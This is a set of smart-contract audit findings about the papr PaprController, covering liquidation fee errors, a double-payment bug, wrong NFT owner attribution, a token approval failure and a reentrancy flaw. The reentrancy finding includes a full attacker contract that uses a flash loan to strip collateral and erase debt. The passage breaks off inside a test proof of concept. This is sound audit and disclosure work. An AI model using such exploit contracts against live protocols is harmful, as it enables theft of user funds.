# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264-L294   # Vulnerability details  ## Impact Function `purchaseLiquidationAuctionNFT()` purchases a liquidation auction with the controller's papr token. the liquidator pays the papr amount which is equal to price of the auction and receives the auctioned  NFT. contract would transfer paid papr and  pay borrower debt and if there is extra papr left it would be transferred to the user. for extra papr that is not required for brining user debt under max debt, contract gets liquidation penalty but in some cases (when the auctioned NFT is user's last collateral) contract take penalty from all of the transferred papr and not just the extra. so users would lose funds in those situations because of this and the fund could be big because the penalty is 10% of the price of the auction and in most cases user would lose 10% of his debt (the value of the NFT).  ## Proof of Concept This is `purchaseLiquidationAuctionNFT()` code: ```     function purchaseLiquidationAuctionNFT(         Auction calldata auction,         uint256 maxPrice,         address sendTo,         ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo     ) external override {         uint256 collateralValueCached = underwritePriceForCollateral(             auction.auctionAssetContract, ReservoirOracleUnderwriter.PriceKind.TWAP, oracleInfo         ) * _vaultInfo[auction.nftOwner][auction.auctionAssetContract].count;         bool isLastCollateral = collateralValueCached == 0;          uint256 debtCached = _vaultInfo[auction.nftOwner][auction.auctionAssetContract].debt;         uint256 maxDebtCached = isLastCollateral ? debtCached : _maxDebt(collateralValueCached, updateTarget());         /// anything above what is needed to bring this vault under maxDebt is considered excess         uint256 neededToSaveVault = maxDebtCached > debtCached ? 0 : debtCached - maxDebtCached;         uint256 price = _purchaseNFTAndUpdateVaultIfNeeded(auction, maxPrice, sendTo);         uint256 excess = price > neededToSaveVault ? price - neededToSaveVault : 0;         uint256 remaining;          if (excess > 0) {             remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction);         } else {             _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), price);             remaining = debtCached - price;         }          if (isLastCollateral && remaining != 0) {             /// there will be debt left with no NFTs, set it to 0             _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);         }     } ``` As you can see when `collateralValueCached` is 0 and user has no more collaterals left then the value of `isLastCollateral` set as true. and when `isLastCollateral` is true the value of `maxDebtCached` set as `debtCached` (line `maxDebtCached = isLastCollateral ? debtCached : _maxDebt(collateralValueCached, updateTarget());`) and the value of the `neededToSaveVault` would be 0 (line `neededToSaveVault = maxDebtCached > debtCached ? 0 : debtCached - maxDebtCached`) and the `excess` would be equal to `price` (in the line `excess = price > neededToSaveVault ? price - neededToSaveVault : 0`) so all the papr paid by liquidator would considered as excess and contract would get liquidation penalty out of that. so: in current implementation in last collateral liquidation all of the paid papr by liquidator would be considered excess: 1. user has no NFT left. 2. debtCached is 100. 3. collateralValueCached  is 0 and isLastCollateral is true. 4. maxDebtCached would be as debtCached which is 100. 5. neededToSaveVault would be debtCached - maxDebtCached which is 0. 6. excess would equal to price and code would take penalty out of all the price amount.  code wants to take penalty from what borrower is going to receive(other than the required amount for extra debt), but in the current implementation when it is last NFT code took fee from all of the payment. these are the steps shows how issue would harm the borrower and borrower would lose funds: (of course user debt would be set to 0 in the end, but if price was higher than user debt user won't receive the extra amount) 1. user debt is 900 and price of auction is 1000 and user has no NFT left. 2. some one pays 1000 Papr and buys the auctioned token, now user would receive 0 amount because the penalty would be 1000 * 10% = 100 and the debt is 900. 3. but penalty should be (1000-900) * 10% = 10 and user should have received 90 token.  so users would receive less amount when their last NFT is liquidated and the price is higher than debt. users would lose 10% of the their intitled fund. most users can use one token as collateral so the bug can happen most of the time.  ## Tools Used VIM  ## Recommended Mitigation Steps the code should be like this: ``` uint256 maxDebtCached = isLastCollateral ? 0: _maxDebt(collateralValueCached, updateTarget()); ```
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L273   # Vulnerability details  ## Impact  Liquidation might work incorrectly  ## Proof of Concept  There is a function `purchaseLiquidationAuctionNFT()` to allow liquidators to purchase NFTs on auction. In the line 273, the protocol checks if the current NFT is the last collateral using the `collateralValueCached`. But it might be possible for Reservoir Oracle to return zero (for whatever reason) and in that case `collateralValueCached` will be zero even when the `_vaultInfo[auction.nftOwner][auction.auctionAssetContract].count!=0`. One might argue that it is impossible for the Reservoir oracle to return zero output but I think it is safe not to rely on it.  ```solidity PaprController.sol 264:     function purchaseLiquidationAuctionNFT( 265:         Auction calldata auction, 266:         uint256 maxPrice, 267:         address sendTo, 268:         ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo 269:     ) external override { 270:         uint256 collateralValueCached = underwritePriceForCollateral( 271:             auction.auctionAssetContract, ReservoirOracleUnderwriter.PriceKind.TWAP, oracleInfo 272:         ) * _vaultInfo[auction.nftOwner][auction.auctionAssetContract].count; 273:         bool isLastCollateral = collateralValueCached == 0;//@audit not safe 274: 275:         uint256 debtCached = _vaultInfo[auction.nftOwner][auction.auctionAssetContract].debt; 276:         uint256 maxDebtCached = isLastCollateral ? debtCached : _maxDebt(collateralValueCached, updateTarget()); 277:         /// anything above what is needed to bring this vault under maxDebt is considered excess 278:         uint256 neededToSaveVault = maxDebtCached > debtCached ? 0 : debtCached - maxDebtCached; 279:         uint256 price = _purchaseNFTAndUpdateVaultIfNeeded(auction, maxPrice, sendTo);time 280:         uint256 excess = price > neededToSaveVault ? price - neededToSaveVault : 0; 281:         uint256 remaining; 282: 283:         if (excess > 0) { 284:             remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction); 285:         } else { 286:             _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), price); 287:             remaining = debtCached - price; 288:         } 289: 290:         if (isLastCollateral && remaining != 0) { 291:             /// there will be debt left with no NFTs, set it to 0 292:             _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining); 293:         } 294:     } 295:  ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Change the line 273 as below.  ```soliditiy bool isLastCollateral = _vaultInfo[auction.nftOwner][auction.auctionAssetContract].count == 0; ```
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232 https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L31-L61   # Vulnerability details  ## Impact The `PaprController.buyAndReduceDebt` function ([https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232)) should work like this:   1. `msg.sender` swaps some amount of the underlying token for papr token 2. This amount of papr token is used to repay debt for the address in the `account` parameter  `msg.sender` and `account` can be different addresses such that one can repay anyone's debt.    However there is a mistake in the function which leads to this behavior:   1. `msg.sender` swaps some amount of the underlying token for papr token 2. The papr token is sent to the `account` address 3. The papr token is burnt from the `msg.sender` 4. The amount of papr token burnt from the `msg.sender` is used to pay back the debt of the `account` address  The issue is that the swapped papr token are sent to `account` but the papr token are burnt from `msg.sender`.    In the best scenario when calling this function, the msg.sender does not have enough papr token to burn so the function call reverts.    In the scenario that is worse, the `msg.sender` has enough papr token to be burnt.   So the `account` address receives the swapped papr token and the debt of `account` is paid as well by the `msg.sender`.    Thereby the `msg.sender` pays double the amount he wants to.   Once by swapping his underlying tokens for papr.   The second time because his papr token are burnt.    ## Proof of Concept The `PaprController.buyAndReduceDebt` function ([https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232)) calls `UniswapHelpers.swap` ([https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L31-L61](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L31-L61)):   ```solidity (uint256 amountOut, uint256 amountIn) = UniswapHelpers.swap(     pool,     account,     token0IsUnderlying,     params.amount,     params.minOut,     params.sqrtPriceLimitX96,     abi.encode(msg.sender) ); ``` The second parameter which has the value `account` is the recipient of the swap.   The last parameter which is `msg.sender` is the address paying the input amount for the swap.    So the `msg.sender` pays some amount of underlying and the papr that the underlying is swapped for is sent to the `account`.    But then the debt of `account` is reduced by burning papr token from `msg.sender`:   ```solidity _reduceDebt({account: account, asset: collateralAsset, burnFrom: msg.sender, amount: amountOut}); ``` However the papr token from the swap were received by `account`. So the `msg.sender` pays twice and `account` receives twice.    ## Tools Used VSCode  ## Recommended Mitigation Steps The swapped papr token should be sent to the `msg.sender` instead of `account` such that they can then be burnt from `msg.sender`.    In order to achieve this, a single line in `PaprController.buyAndReduceDebt` must be changed:    ```solidity          (uint256 amountOut, uint256 amountIn) = UniswapHelpers.swap(              pool, -            account, +            msg.sender,              token0IsUnderlying,              params.amount,              params.minOut,              params.sqrtPriceLimitX96,             abi.encode(msg.sender)         ); ```
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L159   # Vulnerability details  ## Impact Users will lose collateral NFTs when they are transferred to `PaprController` by an approved address or an operator. ## Proof of Concept The `PaprController` allows users to deposit NFTs as collateral to borrow Papr tokens. One of the way of depositing is by transferring an NFT to the contract directly via a call to `safeTransferFrom`: the contract implements the `onERC721Received` hook that will handle accounting of the transferred NFT ([PaprController.sol#L159](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L159)). However, the hook implementation uses a wrong argument to identify token owner: the first argument, which is used by the contract to identify token owner, is the address of the `safeTransferFrom` function caller, which may be an approved address or an operator. The actual owner address is the second argument ([ERC721.sol#L436](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L436)): ```solidity try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) { ```  Thus, when an NFT is sent by an approved address or an operator, it'll be deposited to the vault of the approved address or operator: ```solidity // test/paprController/OnERC721ReceivedTest.sol  function testSafeTransferByOperator_AUDIT() public {     address operator = address(0x12345);      vm.prank(borrower);     nft.setApprovalForAll(operator, true);      vm.prank(operator);     nft.safeTransferFrom(borrower, address(controller), collateralId, abi.encode(safeTransferReceivedArgs));      // NFT was deposited to the operator's vault.     IPaprController.VaultInfo memory vaultInfo = controller.vaultInfo(operator, collateral.addr);     assertEq(vaultInfo.count, 1);      // Borrower has 0 tokens in collateral.     vaultInfo = controller.vaultInfo(borrower, collateral.addr);     assertEq(vaultInfo.count, 0); }  function testSafeTransferByApproved_AUDIT() public {     address approved = address(0x12345);      vm.prank(borrower);     nft.approve(approved, collateralId);      vm.prank(approved);     nft.safeTransferFrom(borrower, address(controller), collateralId, abi.encode(safeTransferReceivedArgs));      // NFT was deposited to the approved address's vault.     IPaprController.VaultInfo memory vaultInfo = controller.vaultInfo(approved, collateral.addr);     assertEq(vaultInfo.count, 1);      // Borrower has 0 tokens in collateral.     vaultInfo = controller.vaultInfo(borrower, collateral.addr);     assertEq(vaultInfo.count, 0); } ``` ## Tools Used Manual review ## Recommended Mitigation Steps Consider this change: ```diff --- a/src/PaprController.sol +++ b/src/PaprController.sol @@ -156,7 +156,7 @@ contract PaprController is      /// @param _id the id of the NFT      /// @param data encoded IPaprController.OnERC721ReceivedArgs      /// @return selector indicating succesful receiving of the NFT -    function onERC721Received(address from, address, uint256 _id, bytes calldata data) +    function onERC721Received(address, address from, uint256 _id, bytes calldata data)          external          override          returns (bytes4) ```
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L382-L384   # Vulnerability details  ## Impact Because the Papr Controller never gives approval for ERC20 transfers, calls to `safeTransferFrom` on the Papr token will revert with insufficient approval. This will trap proceeds from auctions in the contract and prevent the owner/ DAO from collecting fees, motivating the rating of high severity. The root cause of this issue is misusing `safeTransferFrom` to transfer tokens directly out of the contract instead of using `transfer` directly. The contract will hold the token balance and thus does not need approval to transfer tokens, nor can it approve token transfers in the current implementation.  ## Proof of Concept Comment out [this token approval](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/test/paprController/OwnerFunctions.ft.sol#L67) as the controller contract does not implement functionality to call approve. It doesn't make sense to "prank" a contract account in this context because it deviates from the runtime behavior of the deployed contract. That is, it's impossible for the Papr Controller to approve token transfers. Run `forge test -m testSendPaprFromAuctionFeesWorksIfOwner` and observe that it fails because of insufficient approvals. Replace [the call to `safeTransferFrom`](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L383) with a call to `transfer(to, amount)` and rerun the test. It will now pass and correctly achieve the intended behavior.   ## Tools Used  Foundry  ## Recommended Mitigation Steps Call `transfer(to, amount)` instead of `safeTrasferFrom` [here](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L383). Note, it's unnecessary to use `safeTransfer` as the Papr token doesn't behave irregularly.
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L444   # Vulnerability details  ## Impact  By applying reentrancy attack involving the functions `removeCollateral`, `startLiquidationAuction`, and `purchaseLiquidationAuctionNFT`, an Attacker can steal large amount of fund.  ## Proof of Concept   - Bob (a malicious user) deploys a contract to apply the attack. This contract is called `BobContract`. Please note that all the following transactions are going to be done in one transaction.  - BobContract takes a flash loan of 500K USDC.  - BobContract buys 10 NFTs with ids 1 to 10 from collection which are allowed to be used as collateral in this project. Suppose, each NFT has price of almost 50k USDC.  - BobContract adds those NFTs as collateral by calling the function `addCollateral`. So `_vaultInfo[BobContract][collateral.addr].count = 10`. ``` function addCollateral(IPaprController.Collateral[] calldata collateralArr) external override {         for (uint256 i = 0; i < collateralArr.length;) {             _addCollateralToVault(msg.sender, collateralArr[i]);             collateralArr[i].addr.transferFrom(msg.sender, address(this), collateralArr[i].id);             unchecked {                 ++i;             }         }     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L98  - BobContract borrows the max allowed amount of `PaprToken` that is almost equivalent to 250k USDC (for simplicity I am assuming target price and mark price are equal to 1 USDC. This assumption does not change the attack scenario at all. It is only to simplify the explanation). This amount is equal to 50% of the collateral amount. It can be done by calling the function `increaseDebt`.  ``` function maxDebt(uint256 totalCollateraValue) external view override returns (uint256) {         if (_lastUpdated == block.timestamp) {             return _maxDebt(totalCollateraValue, _target);         }          return _maxDebt(totalCollateraValue, newTarget());     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L393 ``` function _maxDebt(uint256 totalCollateraValue, uint256 cachedTarget) internal view returns (uint256) {         uint256 maxLoanUnderlying = totalCollateraValue * maxLTV;         return maxLoanUnderlying / cachedTarget;     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L556 ``` function increaseDebt(         address mintTo,         ERC721 asset,         uint256 amount,         ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo     ) external override {         _increaseDebt({account: msg.sender, asset: asset, mintTo: mintTo, amount: amount, oracleInfo: oracleInfo});     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138  - BobContract now has 10 NFTs as collateral (worth 500k) and borrowed 10*50k*50% = 250k.  - BobContract intends to call the function `removeCollateral`. (In the normal way of working with the protocol, this is not allowed, because by removing even 1 NFT, the debt 250k becomes larger than max allowed collateral 9*50k*50%). https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L109  - Here is the trick. BobContract calls this function to remove the NFT with id 1. During the removal in the function `_removeCollateral`, the `safeTransferFrom` callbacks the BobContract. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L444 https://github.com/transmissions11/solmate/blob/3a752b8c83427ed1ea1df23f092ea7a810205b6c/src/tokens/ERC721.sol#L120  - In the callback, BobContract calls this function again to remove the next NFT (I mean the NFT with id 2).  - BobContract repeats this for 9 NFTs. So, when all the NFTs with id 1 to 9 are removed from the protocol, in the last callback, BobContract calls the function `startLiquidationAuction` to put the NFT with id 10 on the auction. Please note that after removal of 9 NFTs, they are transferred to BobContract, and `_vaultInfo[BobContract][collateral.addr].count = 1`. So, BobContract health factor is not solvent any more because total debt is the same as before 250k, but max debt is now 1*50k*50% = 25k. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L438 https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297  - After calling the function `startLiquidationAuction`, it checks whether the debt is larger than max debt or not. Since 9 NFTs were removed in the previous steps, `info.count = 1`, so debt is larger than max debt.  ``` if (info.debt < _maxDebt(oraclePrice * info.count, cachedTarget)) {             revert IPaprController.NotLiquidatable();         } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317  - Then, since this last NFT (with id 10) is going to be auctioned, the variable count will be decremented by one, so `_vaultInfo[msg.sender][collateral.addr].count = 0`. Moreover, the starting price for this NFT will be `3*oraclePrice` (because the `auctionStartPriceMultiplier = 3`), so it will be almost 3 * 50k = 150k. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L326 https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L341  - BobContract calls the function `purchaseLiquidationAuctionNFT` to buy it's own NFT with id 10 which is priced at almost 150k. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264  - In this function, we have the followoing variables:    - `collateralValueCached ` = 150k * 0 = 0    - `isLastCollateral ` = TRUE    - `debtCached ` = 250k (same as before)    - `maxDebtCached ` = 250k    - `neededToSaveVault ` = 0    - `price ` = 150k Please note that the functions `_purchaseNFTAndUpdateVaultIfNeeded` and `_purchaseNFT` are called that takes 150k from BobContract and transfers that last NFT with id 10 to BobContract. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L519 https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/NFTEDA/NFTEDA.sol#L72    - `excess ` = 150k Since it is larger than zero, the function `_handleExcess` is called. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L532    - `fee ` = 15k Considering 10% fee on the excess    - `credit` = 135k    - `totalOwed ` = 135k Since this is smaller than `debtCaches` 250k, the function `_reduceDebt` is called to reduce debt from 250k to 115k. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L549    - `remaining` = 115k  - All the above calculations mean that the last NFT is sold at 150k, and 15k is considered as fee, so 135k will be deducted from the debt. Since the debt was 250k, still 115k is remained as debt.  - In the last part of the function `purchaseLiquidationAuctionNFT`, there is a check that makes the debt of BobContract equal to zero. This is the place that BobContract takes profit. It means that the debt of 115k is ignored. ``` if (isLastCollateral && remaining != 0) {             /// there will be debt left with no NFTs, set it to 0             _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);         } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L290  - Now, the control returns back to the contract `PaprController`. So, it compares the debt and max for each collateral removal. Since the debt is set to zero in the previous steps, this check for all 10 NFTs will be passed. ``` if (debt > max) {             revert IPaprController.ExceedsMaxDebt(debt, max);         } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L449  - Now that the attack is finished. BobContract repays the flash loan after selling those 10 NFTs.  - ***Bob had 250k that borrowed at first, then he paid 150k to buy his own NFT with id 10 on the auction, so Bob's profit is equal to 100k. In summary, he could borrow 250k but only repaid 150k and received all his collateral.***  - Please note that taking a flash loan is not necessary, it is just to show that it can increase the attack impact much more.  - Please note that if Bob applies the same attack with only 3 NFTs (each worth 50k) and borrows 75k, he does not take any profit. Because, the last NFT should be bought 3 times the oracle price (3*50k = 150k) while the total debt was 75k.  - ***In order to take profit and steal fund, the attacker at least should add 7 NFTs as collateral and borrow the max debt. Because `numberOfNFT * oraclePrice * 50% > oraclePrice * 3`***  In the following PoC, I am showing how the attack can be applied. Bob deploys the following contract and calls the function `attack()`. It takes flash loan from AAVE, then the callback from the AAVE will execute `executeOperation`. In this function, 10 NFTs with ids 1 to 10 are bought and added as collateral to the protocol.  Then, it borrows max debt which is almost 250k, and remove the NFT with id 1.  In the callback of `safeTransferFrom`, the function `onERC721Received` is called, if the number of callback is less than 9, it repeats removal of the NFTs with ids 2 to 9, respectively.  When NFTs with id 9 is removed, the function `startLiquidationAuction` is called to auction NFT with id 10. Then, this NFT is purchased by BobContract immediately at the start price (which is defined by protocol to be 3 times larger than the oracle price). Then, after the control is returned to the protocol, BobContract sells these 10 NFTs and repays the flash loan.  ``` // SPDX-License-Identifier: MIT pragma solidity 0.8.0;  interface ERC721 {}  interface ERC20 {}  struct Collateral {     ERC721 addr;     uint256 id; } struct OracleInfo {     Message message;     Sig sig; } struct Message {     bytes32 id;     bytes payload;     uint256 timestamp;     bytes signature; } struct Sig {     uint8 v;     bytes32 r;     bytes32 s; } struct Auction {     address nftOwner;     uint256 auctionAssetID;     ERC721 auctionAssetContract;     uint256 perPeriodDecayPercentWad;     uint256 secondsInPeriod;     uint256 startPrice;     ERC20 paymentAsset; }  enum PriceKind {     SPOT,     TWAP,     LOWER,     UPPER }  interface IPaprController {     function addCollateral(Collateral[] calldata collateral) external;      function increaseDebt(         address mintTo,         ERC721 asset,         uint256 amount,         OracleInfo calldata oracleInfo     ) external;      function removeCollateral(         address sendTo,         Collateral[] calldata collateralArr,         OracleInfo calldata oracleInfo     ) external;      function startLiquidationAuction(         address account,         Collateral calldata collateral,         OracleInfo calldata oracleInfo     ) external returns (Auction memory auction);      function purchaseLiquidationAuctionNFT(         Auction calldata auction,         uint256 maxPrice,         address sendTo,         OracleInfo calldata oracleInfo     ) external;      function maxDebt(uint256 totalCollateraValue)         external         view         returns (uint256);      function underwritePriceForCollateral(         ERC721 asset,         PriceKind priceKind,         OracleInfo memory oracleInfo     ) external returns (uint256); }  interface IFundingRateController {     function updateTarget() external returns (uint256); }  interface IAAVE {     function flashLoanSimple(         address receiverAddress,         address asset,         uint256 amount,         bytes calldata params,         uint16 referralCode     ) external; }  contract BobContract {     IPaprController iPaprController;     IFundingRateController iFundingRateController;     IAAVE iAAVE;     ERC721 nftCollectionAddress;     ERC20 paprToken;     Collateral[] collaterals;     OracleInfo oracleInfo;     uint256 numOfCallback;     address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;      constructor(         address _paprControllerAddress,         address _fundingRateControllerAddress,         address _aaveAddress,         ERC721 _nftCollectionAddress,         OracleInfo memory _oracleInfo,         ERC20 _paprToken     ) {         iPaprController = IPaprController(_paprControllerAddress);         iFundingRateController = IFundingRateController(             _fundingRateControllerAddress         );         iAAVE = IAAVE(_aaveAddress);         nftCollectionAddress = _nftCollectionAddress;         oracleInfo = _oracleInfo;         paprToken = _paprToken;     }      function attack() public {         ///// STEP1: taking flash loan         iAAVE.flashLoanSimple(address(this), USDC, 10 * 50000 * 10**6, "", 0);     }      function executeOperation(         address[] calldata assets,         uint256[] calldata amounts,         uint256[] calldata premiums,         address initiator,         bytes calldata params     ) external returns (bool) {         ///// STEP2: buying 10 NFTs          // Buy 10 NFTs that each worths almost 50k         // Assume the ids are from 1 to 10          ///// STEP3: adding the NFTs as collateral         for (uint256 i = 0; i < 10; ++i) {             collaterals.push(Collateral({addr: nftCollectionAddress, id: i}));         }         iPaprController.addCollateral(collaterals);          ///// STEP4: borrowing as much as possible         uint256 oraclePrice = iPaprController.underwritePriceForCollateral(             nftCollectionAddress,             PriceKind.LOWER,             oracleInfo         );          uint256 maxDebt = iPaprController.maxDebt(10 * oraclePrice);          iPaprController.increaseDebt(             address(this),             nftCollectionAddress,             maxDebt,             oracleInfo         );          ///// STEP5: removing the NFT with id 1         Collateral[] memory collateralArr = new Collateral[](1);         collateralArr[0] = Collateral({addr: nftCollectionAddress, id: 1});         iPaprController.removeCollateral(             address(this),             collateralArr,             oracleInfo         );          ///// STEP16: selling 10 NFTs and repaying the flash loan          // Selling the 10 NFTs         // Repaying the flash loan     }      function onERC721Received(         address from,         address,         uint256 _id,         bytes calldata data     ) external returns (bytes4) {         numOfCallback++;         if (numOfCallback < 9) {             ///// STEP6 - STEP13: removing the NFTs with id 2 to 9             Collateral[] memory collateralArr = new Collateral[](1);             collateralArr[0] = Collateral({                 addr: nftCollectionAddress,                 id: _id + 1             });             iPaprController.removeCollateral(                 address(this),                 collateralArr,                 oracleInfo             );         } else {             ///// STEP14: starting the auction for NFT with id 10             Collateral memory lastCollateral = Collateral({                 addr: nftCollectionAddress,                 id: _id + 1             });             iPaprController.startLiquidationAuction(                 address(this),                 lastCollateral,                 oracleInfo             );              ///// STEP15: buying the NFT with id 10 on the auction             uint256 oraclePrice = iPaprController.underwritePriceForCollateral(                 nftCollectionAddress,                 PriceKind.LOWER,                 oracleInfo             );             uint256 startPrice = (oraclePrice * 3 * 1e18) /                 iFundingRateController.updateTarget();              Auction memory auction = Auction({                 nftOwner: address(this),                 auctionAssetID: 10,                 auctionAssetContract: nftCollectionAddress,                 perPeriodDecayPercentWad: 0.7e18,                 secondsInPeriod: 1 days,                 startPrice: startPrice,                 paymentAsset: paprToken             });              iPaprController.purchaseLiquidationAuctionNFT(                 auction,                 startPrice,                 address(this),                 oracleInfo             );         }     } }  ```  ## Tools Used  ## Recommended Mitigation Steps  - Adding a reentrancy guard to the involved functions can be a solution.
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264-L294   # Vulnerability details  ## Impact The proceeds from the collateral auctions will not be used to fill the debt shortfall, but be transferred directly to the borrower.  ## Proof of Concept  Assume N is an allowed NFT, B is a borrower, the vault V is `_vaultInfo[B][N]`:  1. B add two NFTs(N-1 and N-2) as collaterals to vault V. 2. B [increaseDebt()](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138) of vault V. 3. The vault V becomes liquidatable 4. Someone calls [startLiquidationAuction()](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297) to liquidate collateral N-1. 5. No one buys N-1 because the price of N is falling 6. After [liquidationAuctionMinSpacing - 2days](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L41), someone calls [startLiquidationAuction()](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297) to liquidate collateral N-2 7. Someone calls [purchaseLiquidationAuctionNFT](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264) to purchase N-1. Partial of the debt is filled, while the remaining (shortfall) is burnt:   ```solidity   if (isLastCollateral && remaining != 0) {       /// there will be debt left with no NFTs, set it to 0       _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);   }   ``` 8. Someone calls [purchaseLiquidationAuctionNFT](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264) to purchase N-2. All the excess will be transferred to B because `neededToSaveVault` is 0 and `debtCached` is 0:   ```solidity   if (excess > 0) {       remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction);   }   ```  **The tokens being transferred to the borrower in step 8 should be used to fill the shortfall of the vault.** Test code for PoC: ```solidity diff --git a/test/paprController/PoC.sol b/test/paprController/PoC.sol new file mode 100644 index 0000000..0b12914 --- /dev/null +++ b/test/paprController/PoC.sol @@ -0,0 +1,147 @@ +// SPDX-License-Identifier: GPL-2.0-or-later +pragma solidity ^0.8.17; + +import "forge-std/console.sol"; +import {ERC721} from "solmate/tokens/ERC721.sol"; + +import {ReservoirOracleUnderwriter} from "../../src/ReservoirOracleUnderwriter.sol"; +import {INFTEDA} from "../../src/NFTEDA/extensions/NFTEDAStarterIncentive.sol"; + +import {BasePaprControllerTest} from "./BasePaprController.ft.sol"; +import {IPaprController} from "../../src/interfaces/IPaprController.sol"; + +contract PoC is BasePaprControllerTest { +    event ReduceDebt(address indexed account, ERC721 indexed collateralAddress, uint256 amount); +    event Transfer(address indexed from, address indexed to, uint256 amount); + +    INFTEDA.Auction auction1; +    INFTEDA.Auction auction2; +    address purchaser = address(2); + +    function setUp() public override { +        super.setUp(); + +        // mint a second collateral +        nft.mint(borrower, collateralId+1); +        // add collaterals, loan max and sells +        _addCollaterals(); +        _loanMaxAndSell(); +        // borrower now has 2.9... USD +        assertGt(underlying.balanceOf(borrower), 2.9e6); + +        // prepare purchaser +        vm.startPrank(purchaser); +        safeTransferReceivedArgs.debt = controller.maxDebt(oraclePrice) - 10; +        safeTransferReceivedArgs.proceedsTo = purchaser; +        safeTransferReceivedArgs.swapParams.minOut = 0; +        for (uint i = 0; i < 